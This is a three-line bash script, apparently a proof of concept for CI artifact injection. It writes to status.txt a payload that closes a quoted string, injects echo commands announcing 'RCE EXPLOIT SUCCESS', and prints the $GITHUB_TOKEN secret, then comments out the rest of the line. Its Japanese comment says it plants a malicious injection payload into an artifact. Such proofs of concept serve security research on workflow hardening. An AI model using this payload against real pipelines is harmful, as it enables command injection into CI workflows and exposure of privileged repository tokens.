#!/bin/bash
# 悪意のあるインジェクション・ペイロードをアーティファクトに仕込む
echo 'Failed"; echo "🚨🚨🚨 RCE EXPLOIT SUCCESS 🚨🚨🚨"; echo "Privileged Token is: $GITHUB_TOKEN"; #' > status.txt
